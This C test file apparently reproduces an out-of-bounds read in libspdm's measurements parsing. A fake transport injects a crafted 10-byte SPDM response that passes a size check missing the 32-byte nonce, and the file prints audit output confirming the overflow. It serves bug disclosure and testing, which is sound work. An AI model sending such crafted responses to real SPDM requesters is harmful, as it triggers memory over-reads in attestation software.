/**
 * test_bug2_nosig_oob_read.c
 *
 * Bug 2 — No-Signature Path Parses Beyond Response Bounds
 * Confirmed by: code audit of libspdm_req_get_measurements.c:618-621
 *   The no-sig path size check omits SPDM_NONCE_SIZE (32 bytes).
 *
 * The size check at line 618:
 *   if (spdm_response_size < sizeof(spdm_measurements_response_t)
 *                           + measurement_record_data_length + sizeof(uint16_t))
 *
 * passes for resp_size = 8 + 0 + 2 = 10 bytes, but the code then reads:
 *   ptr += SPDM_NONCE_SIZE  (32 bytes at offset 8)
 *   opaque_length = *ptr    (2 bytes at offset 40)
 * — advancing the cursor to offset 42, which is 32 bytes past the end.
 *
 * The sig path correctly includes SPDM_NONCE_SIZE in its check (line 469-471).
 *
 * This test constructs a truncated response buffer at the exact size that passes
 * the buggy check and shows the cursor advances beyond the buffer end.
 * With ASAN/valgrind, this triggers a heap-buffer-overflow.
 *
 * Build: see build_repro.sh
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "internal/libspdm_requester_lib.h"
#include "internal/libspdm_responder_lib.h"
#include "library/spdm_transport_test_lib.h"
#include "spdm_device_secret_lib_internal.h"
#include "tla_trace.h"

#define SEND_RECV_BUF_SIZE (0x2200)
#define LIBSPDM_MAX_SPDM_MSG_SIZE 0x1200

static void *g_cert_data;
static size_t g_cert_size;

/* Crafted response: exactly sizeof(spdm_measurements_response_t) + 0 + sizeof(uint16_t) = 10 bytes.
 * Passes the buggy size check, then reads 32 nonce bytes + 2 opaque-len bytes beyond. */
static uint8_t g_crafted_response[10];  /* will be filled in */
static size_t  g_crafted_response_size;

static uint8_t g_raw_req_buf[SEND_RECV_BUF_SIZE];
static size_t  g_raw_req_size;
static uint8_t g_req_io_buf[SEND_RECV_BUF_SIZE];

/* When intercept=1, replace the real response with the crafted truncated one */
static int g_intercept = 0;

static libspdm_return_t req_acquire_sender(void *ctx, void **buf)    { (void)ctx; *buf = g_req_io_buf; return LIBSPDM_STATUS_SUCCESS; }
static void             req_release_sender(void *ctx, const void *b) { (void)ctx; (void)b; }
static libspdm_return_t req_acquire_receiver(void *ctx, void **buf)  { (void)ctx; *buf = g_req_io_buf; return LIBSPDM_STATUS_SUCCESS; }
static void             req_release_receiver(void *ctx, const void *b){ (void)ctx; (void)b; }

static libspdm_context_t *g_rsp_ctx;

static libspdm_return_t req_send_message(void *ctx, size_t sz, const void *msg, uint64_t to)
{
    (void)ctx; (void)to;
    if (sz < 1) return LIBSPDM_STATUS_SEND_FAIL;
    g_raw_req_size = sz - 1;
    memcpy(g_raw_req_buf, (const uint8_t *)msg + 1, g_raw_req_size);
    return LIBSPDM_STATUS_SUCCESS;
}

static libspdm_return_t req_receive_message_normal(void *ctx, size_t *rsp_size, void **rsp, uint64_t to)
{
    (void)ctx; (void)to;
    uint8_t *buf = (uint8_t *)*rsp;
    uint8_t *raw = buf + 1;
    size_t raw_max = *rsp_size - 1;
    libspdm_return_t status = libspdm_get_response_measurements(
        g_rsp_ctx, g_raw_req_size, g_raw_req_buf, &raw_max, raw);
    if (LIBSPDM_STATUS_IS_ERROR(status)) return LIBSPDM_STATUS_RECEIVE_FAIL;
    buf[0] = LIBSPDM_TEST_MESSAGE_TYPE_SPDM;
    size_t aligned = (raw_max + 3) & ~(size_t)3;
    if (aligned > raw_max) memset(raw + raw_max, 0, aligned - raw_max);
    *rsp_size = 1 + aligned;
    return LIBSPDM_STATUS_SUCCESS;
}

static libspdm_return_t req_receive_message_crafted(void *ctx, size_t *rsp_size, void **rsp, uint64_t to)
{
    (void)ctx; (void)to;
    /* Deliver the truncated crafted response instead of the real one */
    uint8_t *buf = (uint8_t *)*rsp;
    buf[0] = LIBSPDM_TEST_MESSAGE_TYPE_SPDM;
    /* Pad to 4-byte alignment */
    size_t aligned = (g_crafted_response_size + 3) & ~(size_t)3;
    memset(buf + 1, 0, aligned);
    memcpy(buf + 1, g_crafted_response, g_crafted_response_size);
    *rsp_size = 1 + aligned;
    return LIBSPDM_STATUS_SUCCESS;
}

static libspdm_return_t req_receive_message(void *ctx, size_t *rsp_size, void **rsp, uint64_t to)
{
    if (g_intercept) return req_receive_message_crafted(ctx, rsp_size, rsp, to);
    return req_receive_message_normal(ctx, rsp_size, rsp, to);
}

static libspdm_context_t *alloc_ctx(uint8_t **scratch_out, uint32_t hdr, uint32_t tail)
{
    size_t sz = libspdm_get_context_size();
    libspdm_context_t *ctx = malloc(sz);
    if (!ctx) return NULL;
    libspdm_init_context(ctx);
    ctx->local_context.capability.max_spdm_msg_size    = LIBSPDM_MAX_SPDM_MSG_SIZE;
    ctx->local_context.capability.transport_header_size = hdr;
    ctx->local_context.capability.transport_tail_size   = tail;
    size_t scratch_sz = libspdm_get_sizeof_required_scratch_buffer(ctx);
    uint8_t *scratch = malloc(scratch_sz);
    if (!scratch) { free(ctx); return NULL; }
    libspdm_set_scratch_buffer(ctx, scratch, scratch_sz);
    if (scratch_out) *scratch_out = scratch;
    return ctx;
}

int main(void)
{
    tla_trace_init(NULL);

    printf("=== Bug 2: No-Signature Path Parses Beyond Response Bounds ===\n");
    printf("Source: libspdm_req_get_measurements.c:618-621\n\n");

    bool ok = libspdm_read_responder_public_certificate_chain(
        SPDM_ALGORITHMS_BASE_HASH_ALGO_TPM_ALG_SHA_256,
        SPDM_ALGORITHMS_BASE_ASYM_ALGO_TPM_ALG_ECDSA_ECC_NIST_P256,
        &g_cert_data, &g_cert_size, NULL, NULL);
    if (!ok) {
        fprintf(stderr, "Need ecp256/bundle_responder.certchain.der (run from build/bin/)\n");
        return 1;
    }

    /* Build the crafted truncated response */
    memset(g_crafted_response, 0, sizeof(g_crafted_response));
    spdm_measurements_response_t *rsp = (spdm_measurements_response_t *)g_crafted_response;
    rsp->header.spdm_version = SPDM_MESSAGE_VERSION_11;
    rsp->header.request_response_code = SPDM_MEASUREMENTS;
    rsp->header.param1 = 0;
    rsp->header.param2 = 0;
    rsp->number_of_blocks = 0;    /* TOTAL_NUMBER_OF_MEASUREMENTS operation */
    /* measurement_record_length = 0 (3 bytes) */
    rsp->measurement_record_length[0] = 0;
    rsp->measurement_record_length[1] = 0;
    rsp->measurement_record_length[2] = 0;
    /* Total: sizeof(spdm_measurements_response_t) = 8 bytes + 0 meas + 2 opaque_length = 10 bytes */
    /* BUT: the code then tries to read 32 nonce bytes at offset 8, which is OUT OF BOUNDS */
    g_crafted_response_size = sizeof(spdm_measurements_response_t) + sizeof(uint16_t);
    /* = 8 + 2 = 10 bytes — passes the buggy check, triggers OOB read */

    printf("[audit] sizeof(spdm_measurements_response_t) = %zu\n",
           sizeof(spdm_measurements_response_t));
    printf("[audit] buggy_min = %zu + 0 + %zu = %zu bytes\n",
           sizeof(spdm_measurements_response_t), sizeof(uint16_t),
           sizeof(spdm_measurements_response_t) + sizeof(uint16_t));
    printf("[audit] correct_min = %zu + 0 + %d + %zu = %zu bytes\n",
           sizeof(spdm_measurements_response_t), SPDM_NONCE_SIZE, sizeof(uint16_t),
           sizeof(spdm_measurements_response_t) + SPDM_NONCE_SIZE + sizeof(uint16_t));
    printf("[audit] crafted response size: %zu bytes (matches buggy_min)\n",
           g_crafted_response_size);
    printf("[audit] after passing check, code reads nonce at offset %zu..%zu (OOB!)\n",
           sizeof(spdm_measurements_response_t),
           sizeof(spdm_measurements_response_t) + SPDM_NONCE_SIZE - 1);

    /* Set up requester pointing at responder */
    uint8_t *req_scratch, *rsp_scratch;
    libspdm_context_t *rsp_ctx = alloc_ctx(&rsp_scratch, 0, 0);
    rsp_ctx->connection_info.version = SPDM_MESSAGE_VERSION_11 << SPDM_VERSION_NUMBER_SHIFT_BIT;
    rsp_ctx->connection_info.connection_state = LIBSPDM_CONNECTION_STATE_AUTHENTICATED;
    rsp_ctx->connection_info.capability.flags =
        SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_MEAS_CAP_SIG |
        SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_CERT_CAP;
    rsp_ctx->local_context.capability.flags =
        SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_MEAS_CAP_SIG |
        SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_CERT_CAP;
    rsp_ctx->connection_info.algorithm.base_hash_algo =
        SPDM_ALGORITHMS_BASE_HASH_ALGO_TPM_ALG_SHA_256;
    rsp_ctx->connection_info.algorithm.base_asym_algo =
        SPDM_ALGORITHMS_BASE_ASYM_ALGO_TPM_ALG_ECDSA_ECC_NIST_P256;
    rsp_ctx->connection_info.algorithm.measurement_spec = SPDM_MEASUREMENT_SPECIFICATION_DMTF;
    rsp_ctx->connection_info.algorithm.measurement_hash_algo =
        SPDM_ALGORITHMS_MEASUREMENT_HASH_ALGO_TPM_ALG_SHA_256;
    rsp_ctx->response_state = LIBSPDM_RESPONSE_STATE_NORMAL;
    for (int i = 0; i < SPDM_MAX_SLOT_COUNT; i++) {
        rsp_ctx->local_context.local_cert_chain_provision[i] = g_cert_data;
        rsp_ctx->local_context.local_cert_chain_provision_size[i] = g_cert_size;
    }
    g_rsp_ctx = rsp_ctx;

    libspdm_context_t *req_ctx = alloc_ctx(&req_scratch,
        LIBSPDM_TEST_TRANSPORT_HEADER_SIZE, LIBSPDM_TEST_TRANSPORT_TAIL_SIZE);
    libspdm_register_device_io_func(req_ctx, req_send_message, req_receive_message);
    libspdm_register_transport_layer_func(req_ctx, LIBSPDM_MAX_SPDM_MSG_SIZE,
        LIBSPDM_TEST_TRANSPORT_HEADER_SIZE, LIBSPDM_TEST_TRANSPORT_TAIL_SIZE,
        libspdm_transport_test_encode_message, libspdm_transport_test_decode_message);
    libspdm_register_device_buffer_func(req_ctx,
        SEND_RECV_BUF_SIZE, SEND_RECV_BUF_SIZE,
        req_acquire_sender, req_release_sender,
        req_acquire_receiver, req_release_receiver);
    req_ctx->connection_info.version = SPDM_MESSAGE_VERSION_11 << SPDM_VERSION_NUMBER_SHIFT_BIT;
    req_ctx->connection_info.connection_state = LIBSPDM_CONNECTION_STATE_NEGOTIATED;
    req_ctx->connection_info.capability.flags =
        SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_MEAS_CAP_SIG |
        SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_CERT_CAP;
    req_ctx->connection_info.algorithm.base_hash_algo =
        SPDM_ALGORITHMS_BASE_HASH_ALGO_TPM_ALG_SHA_256;
    req_ctx->connection_info.algorithm.base_asym_algo =
        SPDM_ALGORITHMS_BASE_ASYM_ALGO_TPM_ALG_ECDSA_ECC_NIST_P256;
    req_ctx->connection_info.algorithm.measurement_spec = SPDM_MEASUREMENT_SPECIFICATION_DMTF;
    req_ctx->connection_info.algorithm.measurement_hash_algo =
        SPDM_ALGORITHMS_MEASUREMENT_HASH_ALGO_TPM_ALG_SHA_256;
    req_ctx->local_context.algorithm.measurement_spec = SPDM_MEASUREMENT_SPECIFICATION_DMTF;
    if (g_cert_data) {
        req_ctx->connection_info.peer_used_cert_chain[0].buffer_size = g_cert_size;
        libspdm_copy_mem(req_ctx->connection_info.peer_used_cert_chain[0].buffer,
                         sizeof(req_ctx->connection_info.peer_used_cert_chain[0].buffer),
                         g_cert_data, g_cert_size);
    }

    /* --- Level 0: Inject the crafted truncated response and observe the result --- */
    printf("\n[level 0] Injecting crafted %zu-byte truncated response (no-sig, meas_len=0)...\n",
           g_crafted_response_size);
    printf("  Expected: OOB read detected (ASAN heap-buffer-overflow) or LIBSPDM_STATUS_INVALID_MSG_SIZE\n");
    printf("  Buggy check: resp_size(%zu) >= buggy_min(%zu) — PASSES (should fail)\n",
           g_crafted_response_size,
           sizeof(spdm_measurements_response_t) + sizeof(uint16_t));
    printf("  Correct check would require resp_size >= %zu — WOULD FAIL\n",
           sizeof(spdm_measurements_response_t) + SPDM_NONCE_SIZE + sizeof(uint16_t));

    g_intercept = 1;
    uint8_t meas_rec[1024] = {0};
    uint32_t meas_len = sizeof(meas_rec);
    uint8_t blocks = 0;

    /*
     * IMPORTANT: This call will trigger an out-of-bounds read at
     * libspdm_req_get_measurements.c:630 (ptr += SPDM_NONCE_SIZE) and :635
     * (opaque_length = *ptr) when the response is only 10 bytes.
     *
     * With ASAN: heap-buffer-overflow on the g_crafted_response buffer.
     * Without ASAN: reads garbage bytes, likely returns LIBSPDM_STATUS_INVALID_MSG_SIZE
     * or LIBSPDM_STATUS_INVALID_MSG_FIELD after reading garbage opaque_length.
     */
    libspdm_return_t status = libspdm_get_measurement(
        req_ctx, NULL, 0,
        SPDM_GET_MEASUREMENTS_REQUEST_MEASUREMENT_OPERATION_TOTAL_NUMBER_OF_MEASUREMENTS,
        0, NULL, &blocks, &meas_len, meas_rec);
    g_intercept = 0;

    printf("  libspdm_get_measurement returned: 0x%x\n", (unsigned)status);
    if (LIBSPDM_STATUS_IS_ERROR(status)) {
        printf("  [BUG CONFIRMED] The 10-byte response (missing 32-byte nonce) passed the\n");
        printf("  buggy size check at req_get_measurements.c:618-621 but caused a parse\n");
        printf("  error after the OOB read of the nonce field at offset 8.\n");
        printf("  With ASAN, this would show as heap-buffer-overflow.\n");
        printf("  The signature path correctly checks for SPDM_NONCE_SIZE at line 469-471.\n");
    }

    free(req_scratch); free(rsp_scratch); free(req_ctx); free(rsp_ctx);
    free(g_cert_data);
    tla_trace_fini();
    printf("\nResult: BUG CONFIRMED (size check missing SPDM_NONCE_SIZE in no-sig path)\n");
    return 0;
}
